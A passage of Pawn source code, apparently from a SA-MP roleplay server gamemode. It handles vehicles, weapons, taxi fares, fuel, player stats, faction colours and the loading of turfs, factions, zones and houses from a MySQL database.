		case 27: GangZoneShowForPlayer(playerid, Turfs[turf], 0xCC330099);
	}
	return true;
}
stock SetVehicleColor(vehicleid) {
	ChangeVehicleColorEx(vehicleid, VehicleStats[vehicleid][vColorOne], VehicleStats[vehicleid][vColorTwo]);
	return true;
}
stock SetVehiclePosEx(vehicleid, Float:x, Float:y, Float:z) {
	SetVehiclePos(vehicleid, x, y, z);
	return true;
}
stock SetVehicleZAngleEx(vehicleid, Float:z_angle) {
	SetVehicleZAngle(vehicleid, z_angle);
	return true;
}
stock ResetWeapons(playerid) {
	ResetPlayerWeapons(playerid);
	static const bool:reset_var[47]={false,...};
	WeaponAmmo[playerid] = reset_var;
	Weapons[playerid] = reset_var;
	return true;
}
redist::HaveWeapons(playerid) {
	new x, Player_Weapons[13], Player_Ammos[13];
	for(new i = 1;i <= 12;i++) {
		GetPlayerWeaponData(playerid,i,Player_Weapons[i],Player_Ammos[i]);
		if(Player_Weapons[i] != 0) x++;
	}	
	return x;
}
ServerWeapon(playerid, weaponid, ammo) {
	if(PlayerInfo[playerid][pGunLic] == 0 && weaponid >= 8 && weaponid != 43 || weaponid == 9 && PlayerInfo[playerid][pJob] == 0 && JobWorking[playerid] == 0 && PlayerInfo[playerid][pGunLic] == 0) return true;
	Weapons[playerid][weaponid] = true;
	WeaponAmmo[playerid][GetWeaponSlot(weaponid)] += ammo;
	GivePlayerWeapon(playerid, weaponid, ammo);
	return true;
}

task MesajStaff[600000]() {
	if(Iter_Count(report_players) || Iter_Count(newbie_players)) return SendStaffMessage(COLOR_YELLOW, ">> There are %d pending questions and %d reports. <<", Iter_Count(newbie_players), Iter_Count(report_players));
	return HideDeathMessage();
}

redist::GameTextForPaint(const string[], paint) {
	foreach(new i : InPaint<paint>) GameTextForPlayer(i, string, 1500, 4);	
	return true;
}
task HelperQuestions[10000]() {
	new taxi=-1;
	foreach(new playerid : logged_players) {
		if((taxi=TaxiDriver[playerid]) == -1) continue;
		if(!TaxiDuty[taxi]) return true;

		if(GetPlayerCash(playerid) < Fare[taxi]) return RemovePlayerFromVehicle(playerid);

		TaxiMoney[taxi] += Fare[taxi];
		TaxiMoney[playerid] += Fare[playerid];
		GivePlayerCash(playerid, -Fare[playerid]);
	    UpdateTaxiTextdraw(playerid);
	    UpdateTaxiTextdraw(taxi);
	}
	return true;
}

stock GetVehicleConsum(i) {
	switch(i) {
		case 0: return 0;
		case 1..34: return 1;
		case 35..64: return 2;
		case 65..99: return 3;
		case 100..134: return 4;
		case 135..164: return 5;
		case 165..200: return 6;
		default: return 7;
	}
	return 0;
}
redist::Checkvehinfo(i) {
	if(!PlayerInfo[i][pHudGen]) return true;
	if(GetPlayerState(i) != PLAYER_STATE_DRIVER || player_selected[i] == 15) return true;

	new 
		engine,lights,alarm,doors,bonnet,boot,objective,
		vehicle = GetPlayerVehicleID(i), spe = Carspeed(GetPlayerVehicleID(i)), carid = FindSpawnID(vehicle);
		
	GetVehicleParamsEx(vehicle,engine,lights,alarm,doors,bonnet,boot,objective);

	gString[0] = EOS;
	va_PlayerTextDrawSetString(i, SpeedometerPTD[0], "%s%d", spe < 100 ? ("~g~") : spe >= 150 ? ("~r~") : ("~y~"), spe);

	if(carid != -1) {
		if(!CarInfo[carid][cClan]) {
			if(!IsABike(GetVehicleModel(vehicle)) && !IsAPlane(GetVehicleModel(vehicle))) format(gString, 35, "fuel: %s%d~w~~h~ (c: %dl)~n~", Gas[vehicle] > 60 ? ("~g~") : Gas[vehicle] <= 30 ? ("~r~") : ("~y~"), Gas[vehicle], GetVehicleConsum(spe));
			format(gString, 80, "%sdoors: %s~n~", gString, doors != 1 ? ("~g~unlocked") : ("~r~locked")); 
			format(gString, 120, "%s~w~~h~odomter: %.2f", gString, CarInfo[carid][KM]);
		} else {
			format(gString, 40, "doors: %s", doors != 1 ? ("~g~unlocked") : ("~r~locked"));
			if(!IsABike(GetVehicleModel(vehicle)) && !IsAPlane(GetVehicleModel(vehicle))) format(gString, 80, "%s~n~~w~~h~fuel: %s%d~w~~h~ (c: %dl)", gString, Gas[vehicle] > 60 ? ("~g~") : Gas[vehicle] <= 30 ? ("~r~") : ("~y~"), Gas[vehicle], GetVehicleConsum(spe));
		}
	}
	else {
		format(gString, 40, "doors: %s", doors != 1 ? ("~g~unlocked") : ("~r~locked"));
		if(!IsABike(GetVehicleModel(vehicle)) && !IsAPlane(GetVehicleModel(vehicle))) format(gString, 80, "%s~n~~w~~h~fuel: %s%d~w~~h~ (c: %dl)", gString, Gas[vehicle] > 60 ? ("~g~") : Gas[vehicle] <= 30 ? ("~r~") : ("~y~"), Gas[vehicle], GetVehicleConsum(spe));
	}
	if(InExamen[i] || (JobWorking[i] && route_selected[i] && PlayerInfo[i][pJob] == 14)) {
		new checkpoints[] =  {0, 19, 22, 20}; checkpoints[0] = dmvCPmax+1;
		new const checkpoints_fale[] = {100, 310, 340, 370};
		format(gString, 150, "%s~n~Checkpoints: ~r~%d/%d", gString, CP[i]-checkpoints_fale[route_selected[i]], checkpoints[route_selected[i]]);
	}
	LastSpeed[i] = spe;
	PlayerTextDrawSetString(i, SpeedometerPTD[2], gString);
	PlayerTextDrawSetString(i, SpeedometerPTD[1], "km/h");
	return true;
}

task CheckGas[20000]()
{
    new engine, lights, alarm, doors, bonnet, boot, objective;
 
    foreach(new i : logged_players)
    {
    	if(VehicleRent[i]) {
    		if(GetPlayerCash(i)<150) {
    			SendClientMessage(i, COLOR_GREY, "Ai fost scos din vehicul pentru ca nu ai destui banii!");
    			RemovePlayerFromVehicle(i);
    			continue;
    		}
    		GivePlayerCash(i, -150);
    		if(IsABike(GetVehicleModel(VehicleRent[i]))) BizzInfo[BizzTypeID[10][0]][bBalance] += 150;
    		else BizzInfo[BizzTypeID[11][0]][bBalance] += 150;
    	}
        if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
        {
            new vehicle = GetPlayerVehicleID(i);
 
            if(Gas[vehicle] >= 1)
            {
                if(vehEngine[vehicle] == 1)
                {
                    if(IsAPlane(GetVehicleModel(vehicle)) || IsABoat(vehicle) || IsABike(GetVehicleModel(vehicle)) || ExamCar[i] == vehicle || JobVehicle[i] == vehicle) { Gas[vehicle]++; }
 
                    if(AFKSeconds[i]<15) Gas[vehicle]--;
 
                    new carid = FindSpawnID(vehicle);
 
                    if(carid != -1)
                    {
                        new spe = Carspeed(GetPlayerVehicleID(i));
                        if(spe > 5 && GetPlayerState(i) == PLAYER_STATE_DRIVER && GetPlayerVehicleID(i) == vehicle && AFKSeconds[i]<15) CarInfo[carid][KM] += (spe * 0.27) / 100;
                    }
                }
            }
 
            else if(!IsAFLYCar(vehicle))
            {
                GameTextForPlayer(i, "No fuel..", 1500, 3);
 
                vehEngine[vehicle] = 0;
 
                GetVehicleParamsEx(vehicle, engine, lights, alarm, doors, bonnet, boot, objective);
                SetVehicleParamsEx(vehicle, VEHICLE_PARAMS_OFF, lights, alarm, doors, bonnet, boot, objective);
            }
        }
    }
    return true;
}


redist::Fillup(playerid, vehicleid, fuel, idd) {
	if(!Refueling[playerid]) return true;
	if(GetPlayerCash(playerid) < fuel) return SendErrorMsg(playerid, "Ai nevoie de $%d pentru a face plinul.", fuel * 1000);
	GivePlayerCash(playerid, -(fuel * 1000)); TogglePlayerControllable(playerid, true);
	BizzInfo[idd][bBalance] += (fuel * 1000)/3; Gas[vehicleid] += fuel; Refueling[playerid] = false;
	return va_SendClientMessage(playerid, COLOR_MONEY, "Rezervor incarcat! Pret: $%s.", FormatNumber(fuel * 1000));
}


cmd:referal(playerid, params[]) {
	if(DeelayCommand[playerid][23]>gettime()) 
		return DeelayTime(playerid, 23);

	DeelayCommand[playerid][23] = gettime()+5;

	if(PlayerInfo[playerid][pReferral]) mysql_format(SQL, gQuery, sizeof gQuery, "SELECT COUNT(*) AS total_players, IFNULL(uu.name, 'None') AS name FROM users u JOIN users uu ON uu.id = %i AND u.Referral = %i", PlayerInfo[playerid][pReferral], PlayerInfo[playerid][pSQLID]);
	else mysql_format(SQL, gQuery, sizeof gQuery, "SELECT COUNT(*) AS total_players, 'None' AS name FROM `users` WHERE `Referral` = '%i'",  PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery, #check_player_referral, #i, playerid);
	return true;
}

redist::check_player_referral(playerid) {
	new name[MAX_PLAYER_NAME], total;
	cache_get_value_name(0, "name", name, MAX_PLAYER_NAME);
	cache_get_value_name_int(0, "total_players", total);
	format(gString, 160, "{9CBAD6}You were brought by: {5A8AD6}%s\n{9CBAD6}Players registered on your referral: {5A8AD6}%d\n{9CBAD6}Your referral ID: {5A8AD6}#%d", name, total, PlayerInfo[playerid][pSQLID]);
	ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "SERVER: Referral info", gString, "Close", "");
	return true;
}

cmd:statsinfo(playerid) {
	format(gString, 160, "1. Account - %s\n2. Faction - %s\n3. Clan - %s\n4. General - %s\n5. Properties - %s", !PlayerInfo[playerid][pStatsInfo][0]?("{0AC917}Enabled"):("{FF0000}Disable"), !PlayerInfo[playerid][pStatsInfo][1]?("{0AC917}Enabled"):("{FF0000}Disable"), !PlayerInfo[playerid][pStatsInfo][2]?("{0AC917}Enabled"):("{FF0000}Disable"), !PlayerInfo[playerid][pStatsInfo][3]?("{0AC917}Enabled"):("{FF0000}Disable"), !PlayerInfo[playerid][pStatsInfo][4]?("{0AC917}Enabled"):("{FF0000}Disable"));
	ShowPlayerDialog(playerid, DIALOG_STATSINFO, DIALOG_STYLE_LIST, "{F4AD42}Stats {FFFFFF}Menu", gString, "Ok", "Close");
	return true;
}

static const _toggle[][] = {"No", "Yes", "Plus", "Plus", "Plus"};
static const _toggleReborn[][] = {"No", "Yes", "Yes (2)", "Yes (3)", "Yes (4)", "Yes (5)"};

stock ShowStats(playerid,targetid) {

	new max_rob=8, radios[15] = {"Disabled"}, faction[64] = {"None"}, pnumber[12] = {"No"}, clan = PlayerInfo[targetid][pClan]; gString[0] = EOS;

	if(PlayerInfo[targetid][pVip] == 3) max_rob=30;
	else if(PlayerInfo[targetid][pPremiumAccount]) max_rob=15;

	
	if(HavePhone(targetid)) format(pnumber, 12, "%s", PlayerInfo[targetid][pPhone]);
	if(WTChannel[targetid]) format(radios, sizeof(radios), "#%d khz", WTChannel[targetid]);
	if(PlayerInfo[targetid][pMember]) format(faction, sizeof faction, "%s (rank %d)", DynamicFactions[PlayerInfo[targetid][pMember]][fName], PlayerInfo[targetid][pRank]);
	va_SendClientMessage(playerid, COLOR_WHITE, "%s[%d], Playing hours: %.2f | Warns: %d/3 | Cash: $%s | Bank: $%s", GetNameEx(targetid), targetid,PlayerInfo[targetid][pConnectTime], PlayerInfo[targetid][pWarns], formatBytes(money[targetid]), formatBytes(bank[targetid]));
	if(!PlayerInfo[targetid][pStatsInfo][0]) va_SendClientMessage(playerid, 0xEBC334FF, "Account: {FFFFFF}Level: %d | Respect Points: %d/%d | Phone: %s | Phone Credit: %d", PlayerInfo[targetid][pLevel], PlayerInfo[targetid][pExp], PlayerInfo[targetid][pLevel] * 3, pnumber, PlayerInfo[targetid][pCredit]);
	if(!PlayerInfo[targetid][pStatsInfo][0]) va_SendClientMessage(playerid, 0xEBC334FF, "Account: {FFFFFF}Premium Points: %d | Premium Account: %s | VIP: %s | Reborn: %s | Legend: %s", PlayerInfo[targetid][pPremiumPoints], _toggle[PlayerInfo[targetid][pPremiumAccount]], _toggle[PlayerInfo[targetid][pVip]], _toggleReborn[PlayerInfo[targetid][pReborn]], PlayerInfo[targetid][pVip] != 3 ? "No" : "Yes");
	if(!PlayerInfo[targetid][pStatsInfo][1]) va_SendClientMessage(playerid, 0xEBC334FF, "Faction: {FFFFFF}%s | Faction Warns: %d/3 | Faction Punish: %d/30 | Days: %d", faction, PlayerInfo[targetid][pFACWarns],PlayerInfo[targetid][pFpunish], PlayerInfo[targetid][pDays]);
	if(clan && !PlayerInfo[targetid][pStatsInfo][2]) va_SendClientMessage(playerid, 0xEBC334FF, "Clan: {FFFFFF}%s (%d) | Clan HQ: %d | Clan Rank: %d | Clan Warns: %d/3 | Clan Days: %d", ClanInfo[clan][clName], clan, ClanInfo[clan][clHQ], PlayerInfo[targetid][pClanRank], PlayerInfo[targetid][pClanWarn], ClanInfo[clan][clDays]);						
	if(!PlayerInfo[targetid][pStatsInfo][3]) va_SendClientMessage(playerid, 0xEBC334FF, "General: {FFFFFF}Rob: %d/%d | Escape: %d/20 | Freq: %s | Crates: %d | Vouchers: %d", PlayerInfo[targetid][pRob], max_rob, PlayerInfo[targetid][pEscapePoints], radios, totalcrates(targetid), totalVouchers(targetid)),
	                                         va_SendClientMessage(playerid, 0xEBC334FF, "General: {FFFFFF}Drugs: %d | Heroin: %d | Materials: %d | Hiddens: %d | Fireworks: %d", PlayerInfo[targetid][pDrugs], PlayerInfo[targetid][pHeroin], PlayerInfo[targetid][pMats], PlayerInfo[targetid][pHidden], PlayerInfo[targetid][pFireworks]),
											 va_SendClientMessage(playerid, 0xEBC334FF, "General: {FFFFFF}Casino Credits: %d | BPoints: %d | Gift Points: %d", PlayerInfo[targetid][pCasinoCredit], PlayerInfo[targetid][pBPoints], PlayerInfo[targetid][pGiftPoints]);
	
	if !PlayerInfo[targetid][pStatsInfo][4] *then {
		format(gString, 64, "Properties: {FFFFFF}Vehicles: %d/%d", Iter_Count(MyVehicle<targetid>), GetVehicleSlots(targetid));	
		if(PlayerInfo[targetid][pHouse] != 999) format(gString, 100, "%s | %sHouse: %d", gString, PlayerInfo[targetid][pHouse] != 999 && strcmp(GetName(targetid), HouseInfo[PlayerInfo[targetid][pHouse]][hOwner], true)?("Rent "):(""), PlayerInfo[targetid][pHouse]);
		if(PlayerInfo[targetid][pBizz] != 255) format(gString, 128, "%s | Business: %d", gString, BizzInfo[PlayerInfo[targetid][pBizz]][bID]);				
		SendClientMessage(playerid, 0xEBC334FF, gString);
	}
		
	if(PlayerInfo[playerid][pAdmin] >= 1) {
		new playersip[16];
		GetPlayerIp(targetid,playersip,sizeof(playersip));
		va_SendClientMessage(playerid, -1, "Seconds: %.0f | AFK: %d | Int: %d | VW: %d | Skin: %d | SQLID: %d | Activity: %.2f (7 days)",PlayerInfo[targetid][pSeconds],AFKSeconds[targetid],GetPlayerInterior(targetid),GetPlayerVirtualWorld(targetid), GetPlayerSkin(playerid), PlayerInfo[targetid][pSQLID], PlayerInfo[playerid][pConnectMonth]);
	}
	new time;
	if(PlayerInfo[targetid][pExpHW] > gettime() && PlayerInfo[targetid][pHW]) {
		time = PlayerInfo[targetid][pExpHW] - gettime();
		va_SendClientMessage(playerid, COLOR_LGREEN, "HW(%d/3) will expire in: %d days, %d hours, %d minutes and %d seconds left.", PlayerInfo[targetid][pHW], time/86400, (time/3600) % 24, ((time/60) % 60), time % 60);
	}
	if(PlayerInfo[targetid][pExpAW] > gettime() && PlayerInfo[targetid][pAW]) {
		time = PlayerInfo[targetid][pExpAW] - gettime();
		va_SendClientMessage(playerid, COLOR_LGREEN, "AW(%d/3) will expire in: %d days, %d hours, %d minutes and %d seconds left.", PlayerInfo[targetid][pAW], time/86400, (time/3600) % 24, ((time/60) % 60), time % 60);
	}
	if(PlayerInfo[targetid][pExpLW] > gettime() && PlayerInfo[targetid][pLW]) {
		time = PlayerInfo[targetid][pExpLW] - gettime();
		va_SendClientMessage(playerid, COLOR_LGREEN, "LW(%d/3) will expire in: %d days, %d hours, %d minutes and %d seconds left.", PlayerInfo[targetid][pLW], time/86400, (time/3600) % 24, ((time/60) % 60), time % 60);
	}
	return true;
}
stock SetPlayerToTeamColor(playerid) {
	switch PlayerInfo[playerid][pMember] do {
		case 0: SetPlayerColor(playerid,COLOR_WHITE);
		case 1: if OnDuty[playerid] == 1 *then SetPlayerColor(playerid, 0x112ef2FF); else SetPlayerColor(playerid,COLOR_WHITE);
		case 2: if OnDuty[playerid] == 1 *then SetPlayerColor(playerid, 0x2b45f5FF); else SetPlayerColor(playerid,COLOR_WHITE);
		case 3: if OnDuty[playerid] == 1 *then SetPlayerColor(playerid, 0x01026bFF); else SetPlayerColor(playerid,COLOR_WHITE);
		case 4: SetPlayerColor(playerid, 0x0CAB3CFF); 
		case 5: SetPlayerColor(playerid, 0x11F2F2FF);
		case 6: SetPlayerColor(playerid, 0xFAD400FF);
		case 7,16,21: SetPlayerColor(playerid, 0x00FF80FF); 
		case 8,22: SetPlayerColor(playerid, 0xFFFFA8FF); 
		case 9: SetPlayerColor(playerid, 0xFFABFCFF); 
		case 10: SetPlayerColor(playerid, 0xAB00FAFF); 
		case 11: SetPlayerColor(playerid, 0x7E3937FF); 
		case 12: SetPlayerColor(playerid, COLOR_YELLOW); 
		case 13,20: SetPlayerColor(playerid, 0xf86448FF); 	
		case 14: if OnDuty[playerid] == 1 *then SetPlayerColor(playerid, 0x112ef2FF); else SetPlayerColor(playerid,COLOR_WHITE);
		case 15: SetPlayerColor(playerid, 0x91FF00FF);
		case 17: SetPlayerColor(playerid, 0x252527FF);
		case 18: SetPlayerColor(playerid, 0x1B376DFF);
		case 19: if OnDuty[playerid] == 1 *then SetPlayerColor(playerid, 0x112EF2FF); else SetPlayerColor(playerid,COLOR_WHITE);
		case 23: SetPlayerColor(playerid, 0xA60505FF);
		case 24: SetPlayerColor(playerid, 0x000000FF);
		case 25: SetPlayerColor(playerid, 0x88421DFF);
		case 26: SetPlayerColor(playerid, 0x669900FF);
		case 27: SetPlayerColor(playerid, 0xCC3300FF);
	}	
    return true;
}

redist::SQL_loadTurfs() {
	printf("[MySQL]\t\t\tgang turfs\t\t%d", (SQL_Turfs=cache_num_rows()));	
	if(!cache_num_rows())
		return true;

	new areaid;
 	for(new i = 1; i <= SQL_Turfs; i++) {
 		cache_get_value_name_int(i-1, "ID", TurfInfo[i][zID]);
 		cache_get_value_name_int(i-1, "Owned", TurfInfo[i][zOwned]);
 		cache_get_value_name_float(i-1, "MinX", TurfInfo[i][zMinX]);
 		cache_get_value_name_float(i-1, "MinY", TurfInfo[i][zMinY]);
 		cache_get_value_name_float(i-1, "MaxX", TurfInfo[i][zMaxX]);
 		cache_get_value_name_float(i-1, "MaxY", TurfInfo[i][zMaxY]);

 		DynamicFactions[TurfInfo[i][zOwned]][fTop]++;
 		if(DynamicFactions[TurfInfo[i][zOwned]][fTop]>DynamicFactions[FactionTop][fTop]) FactionTop=TurfInfo[i][zOwned];
 		Turfs[i] = GangZoneCreateEx(TurfInfo[i][zMinX],TurfInfo[i][zMinY],TurfInfo[i][zMaxX],TurfInfo[i][zMaxY],TurfInfo[i][zID],1.0);
 		areaid = CreateDynamicRectangle(TurfInfo[i][zMinX],TurfInfo[i][zMinY],TurfInfo[i][zMaxX],TurfInfo[i][zMaxY]);
 		AreaID[areaid] = i;
 		AreaType[areaid] = AREA_TURF;
	}	
	return true;
}
redist::LoadFactions() {
	strcat(DynamicFactions[0][fName], "None");
	new factions = cache_num_rows(), raport[30];
    for(new x = 1; x <= factions; x++) {
    	new i = x - 1;
    	cache_get_value_name_int(i, "ID", DynamicFactions[x][fID]);

    	cache_get_value_name(i, "Name", DynamicFactions[x][fName]);
    	cache_get_value_name(i, "Anunt", DynamicFactions[x][fAnn]);
		cache_get_value_name_int(i, "ID", DynamicFactions[x][fID]);				
		cache_get_value_name_float(i, "IntX", DynamicFactions[x][fcX]); 				
		cache_get_value_name_float(i, "IntY", DynamicFactions[x][fcY]); 				
		cache_get_value_name_float(i, "IntZ", DynamicFactions[x][fcZ]); 				
		cache_get_value_name_float(i, "X", DynamicFactions[x][extX]);				
		cache_get_value_name_float(i, "Y", DynamicFactions[x][extY]);				
		cache_get_value_name_float(i, "Z", DynamicFactions[x][extZ]);

		cache_get_value_name_float(i, "sX", DynamicFactions[x][svfX]);		
		cache_get_value_name_float(i, "sY", DynamicFactions[x][svfY]);		
		cache_get_value_name_float(i, "sZ", DynamicFactions[x][svfZ]);	

		cache_get_value_name_float(i, "vX", DynamicFactions[x][svf_v_X]);		
		cache_get_value_name_float(i, "vY", DynamicFactions[x][svf_v_Y]);		
		cache_get_value_name_float(i, "vZ", DynamicFactions[x][svf_v_Z]);	
		cache_get_value_name_float(i, "vRot", DynamicFactions[x][svf_v_Rot]);

		cache_get_value_name_float(i, "eX", DynamicFactions[x][svf_e_X]);		
		cache_get_value_name_float(i, "eY", DynamicFactions[x][svf_e_Y]);		
		cache_get_value_name_float(i, "eZ", DynamicFactions[x][svf_e_Z]);	
		cache_get_value_name_float(i, "eRot", DynamicFactions[x][svf_e_Rot]);	

		cache_get_value_name_int(i, "MaxMembers", DynamicFactions[x][fMaxMembers]);	
		cache_get_value_name_int(i, "VW", DynamicFactions[x][fVW]);			
		cache_get_value_name_int(i, "Interior", DynamicFactions[x][fInterior]); 				
		cache_get_value_name_int(i, "App", DynamicFactions[x][fApp]);
		cache_get_value_name_int(i, "MinLevel", DynamicFactions[x][fLevel]);
		cache_get_value_name_bool(i, "Lock", DynamicFactions[x][fLock]);

		cache_get_value_name(i, "Name1", fRankNames[x][0]);
		cache_get_value_name(i, "Name2", fRankNames[x][1]);
		cache_get_value_name(i, "Name3", fRankNames[x][2]);
		cache_get_value_name(i, "Name4", fRankNames[x][3]);
		cache_get_value_name(i, "Name5", fRankNames[x][4]);
		cache_get_value_name(i, "Name6", fRankNames[x][5]);
		cache_get_value_name(i, "Name7", fRankNames[x][6]);

       	mysql_format(SQL, gQuery, 128, "SELECT COUNT(*) AS total_members FROM `users` WHERE `Member` = '%i'", x);
       	mysql_tquery(SQL, gQuery, "sql_cache_f_num_rows", "i", x);

		for(new r=1;r<=7;r++) {
			format(raport, sizeof raport, "RaportRank%d", r);
			cache_get_value_name(i, raport, raport, 30);
			sscanf(raport, "a<i>[3]", FactionRaport[x][r]);
		}
		updateFaction(x);
		switch(DynamicFactions[x][fID]) {
			case 1,2,3,14,19: CreateDynamicMapIcon(DynamicFactions[x][extX], DynamicFactions[x][extY], DynamicFactions[x][extZ], 30, -1);
		}
	}
	printf("[MySQL]\t\t\tfactions\t\t%d", factions);
	return true;
}

redist::sql_cache_f_num_rows(f) return cache_get_value_name_int(0, "total_members", FactionMembers[f]);

stock updateFaction(x,bool:update=false) {
	new y; gString[0] = EOS;
	if(x!=4&&x!=5&&x!=6&&x!=10) {
		if(update) {
			DestroyDynamicPickup(DynamicFactions[x][fPickup]);
			DestroyDynamic3DTextLabel(DynamicFactions[x][fLabel]);
			DestroyDynamicPickup(DynamicFactions[x][svfPickup]);
			DestroyDynamic3DTextLabel(DynamicFactions[x][svfLabel]);
		}
		switch(x) {
			case 4,5,6,10,17,18,25,26,27: {}
			default: {
				DynamicFactions[x][svfPickup] = CreateDynamicPickup(19133, 23, DynamicFactions[x][svfX], DynamicFactions[x][svfY], DynamicFactions[x][svfZ]);
				format(gString, 128, "{%s}%s's {FFFFFF}SVF\n(use </svf>)", ColorFaction[x], DynamicFactions[x][fName]);
				DynamicFactions[x][svfLabel] = CreateDynamic3DTextLabel(gString, -1, DynamicFactions[x][svfX], DynamicFactions[x][svfY], DynamicFactions[x][svfZ], 10.0);
			}
		}
		format(gString, 128, "{%s}%s{FFFFFF}'s HQ\n(%s)", ColorFaction[x], DynamicFactions[x][fName], !DynamicFactions[x][fLock]?("locked"):("unlocked"));
		DynamicFactions[x][fLabel] = CreateDynamic3DTextLabel(gString,-1,DynamicFactions[x][extX], DynamicFactions[x][extY], DynamicFactions[x][extZ],20.0);
		switch(x) {
			case 1, 2, 3, 14, 19: y = CreateDynamicPickup(1247, 23, DynamicFactions[x][extX], DynamicFactions[x][extY], DynamicFactions[x][extZ]);
			default: y = CreateDynamicPickup(1314, 23, DynamicFactions[x][extX], DynamicFactions[x][extY], DynamicFactions[x][extZ]);
		}
	} else {
		if(update) {
			DestroyDynamicPickup(DynamicFactions[x][fPickup]);
			DestroyDynamic3DTextLabel(DynamicFactions[x][fLabel]);
		}
		format(gString, 128, "%s{FFFFFF}'s HQ\n(%s)", DynamicFactions[x][fName], !DynamicFactions[x][fLock]?("locked"):("unlocked"));
		DynamicFactions[x][fLabel] = CreateDynamic3DTextLabel(gString,-1,DynamicFactions[x][extX], DynamicFactions[x][extY], DynamicFactions[x][extZ],20.0);
		y = CreateDynamicPickup(1313, 23, DynamicFactions[x][extX], DynamicFactions[x][extY], DynamicFactions[x][extZ]);	
	}
	DynamicFactions[x][fPickup] = y;
	PickupInfo[y][pkID] = x;
	PickupInfo[y][pkType] = 3;	
	return true;
}
redist::LoadGraffiti() {
	printf("[MySQL]\t\t\tclans zones\t\t%d", cache_num_rows());
	if(cache_num_rows() == 0)
		return true;

	SQL_clanzone = cache_num_rows();

	new areaid;	gString[0] = EOS;
	for(new i = 1; i <= SQL_clanzone; i++) {
		cache_get_value_name_int(i-1, "ID", GraffitiInfo[i][gfID]);
		cache_get_value_name_float(i-1, "X", GraffitiInfo[i][gfX]);
		cache_get_value_name_float(i-1, "Y", GraffitiInfo[i][gfY]);
		cache_get_value_name_float(i-1, "Z", GraffitiInfo[i][gfZ]);
		cache_get_value_name_float(i-1, "RotX", GraffitiInfo[i][gfRotX]);
		cache_get_value_name_float(i-1, "RotY", GraffitiInfo[i][gfRotY]);
		cache_get_value_name_float(i-1, "RotZ", GraffitiInfo[i][gfRotZ]);
		cache_get_value_name_int(i-1, "Owned", GraffitiInfo[i][gfOwned]);
       	GraffitiInfo[i][gfPlayerSpray]			= -1;

       	ClanInfo[GraffitiInfo[i][gfOwned]][clTop]++;
     	if(ClanInfo[GraffitiInfo[i][gfOwned]][clTop]>ClanInfo[ClanTop][clTop]) ClanTop=i;

     	ClanTurfs[i] = GangZoneCreate(GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfX], GraffitiInfo[i][gfY]);

     	areaid = CreateDynamicRectangle(GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfX], GraffitiInfo[i][gfY]);
	    AreaType[areaid] = AREA_CLANZONE;
	    AreaID[areaid] = i;
	    GraffitiInfo[i][gfObject] = CreateDynamicObject(19353, GraffitiInfo[i][gfX], GraffitiInfo[i][gfY], GraffitiInfo[i][gfZ], GraffitiInfo[i][gfRotX], GraffitiInfo[i][gfRotY], GraffitiInfo[i][gfRotZ]);
	    if(GraffitiInfo[i][gfOwned] == 0 ) gString = "Clan Name\nClan Tag";
	    else format(gString, 128, "{%s}%s\n%s", ClanInfo[GraffitiInfo[i][gfOwned]][clColor], ClanInfo[GraffitiInfo[i][gfOwned]][clName], ClanInfo[GraffitiInfo[i][gfOwned]][clTag]);
	    SetDynamicObjectMaterialText(GraffitiInfo[i][gfObject], 0, gString, OBJECT_MATERIAL_SIZE_512x256, "BankGothic Md BT", 60, 1, 0xfff0f0f0, 0, OBJECT_MATERIAL_TEXT_ALIGN_CENTER);
	}
	return true;
}
redist::InsertSafeZone() {
	new sfz, x;
 	for(new i, j = cache_num_rows(); i != j; i++) {
	    sfz ++;
        cache_get_value_name_int(i, "ID", x); 
 		cache_get_value_name_float(i, "X", SafeZone[x][szX]); 
 		cache_get_value_name_float(i, "Y", SafeZone[x][szY]); 
 		cache_get_value_name_float(i, "Z", SafeZone[x][szZ]); 
       	cache_get_value_name_int(i, "Range", SafeZone[x][szRange]); 

       	SafeZone[x][szArea] = CreateDynamicCircle(SafeZone[x][szX], SafeZone[x][szY], SafeZone[x][szRange]);
       	AreaID[SafeZone[x][szArea]] = x;
       	AreaType[SafeZone[x][szArea]] = AREA_SAFEZONE;
	}
	printf("[MySQL]\t\t\tsafezones\t\t%d", sfz);
	return true;
}

redist::LoadProperty() {
	sql_houses = cache_num_rows();
    for(new i = 1; i <= sql_houses; i++) {
        new idd = i - 1;

		cache_get_value_name_int(idd, "ID", HouseInfo[i][hID]);			
		cache_get_value_name_float(idd, "Entrancex", HouseInfo[i][hEntrancex]); 			
		cache_get_value_name_float(idd, "Entrancey", HouseInfo[i][hEntrancey]); 			
		cache_get_value_name_float(idd, "Entrancez", HouseInfo[i][hEntrancez]); 			
		cache_get_value_name_float(idd, "Exitx", HouseInfo[i][hExitx]);				
		cache_get_value_name_float(idd, "Exity", HouseInfo[i][hExity]);				
		cache_get_value_name_float(idd, "Exitz", HouseInfo[i][hExitz]);				
		cache_get_value_name(idd, "Owner", HouseInfo[i][hOwner]);
		cache_get_value_name(idd, "Discription", HouseInfo[i][hDiscription]);
		cache_get_value_name_int(idd, "Value", HouseInfo[i][hValue]);	
		cache_get_value_name_int(idd, "Hel", HouseInfo[i][hHel]); 			
		cache_get_value_name_int(idd, "Arm", HouseInfo[i][hArm]); 			
		cache_get_value_name_int(idd, "Interior", HouseInfo[i][hInterior]);	
		cache_get_value_name_int(idd, "Lockk", HouseInfo[i][hLock]); 		
		cache_get_value_name_int(idd, "Owned", HouseInfo[i][hOwned]); 		
		cache_get_value_name_int(idd, "Rentabil", HouseInfo[i][hRentabil]); 	
		cache_get_value_name_int(idd, "Takings", HouseInfo[i][hTakings]); 		
		cache_get_value_name_int(idd, "Level", HouseInfo[i][hLevel]); 		
		cache_get_value_name_int(idd, "Radio", HouseInfo[i][hRadio]); 		
		cache_get_value_name_int(idd, "Virtual", HouseInfo[i][hVirtual]); 				
	}
	for(new i = 1; i <= sql_houses; i++) {
		HouseLabel[i] = CreateDynamic3DTextLabel("none", 0xFFFFFF00, HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1,-1, -1, 100.0);
		UpdateLabel(1, i);
	}
	printf("[MySQL]\t\t\thouses\t\t\t%d", sql_houses);
	return true;
}

redist::InsertClans() {
	new x,color[11]; sql_clans = cache_num_rows();
	strcat(ClanInfo[0][clName], "Server");
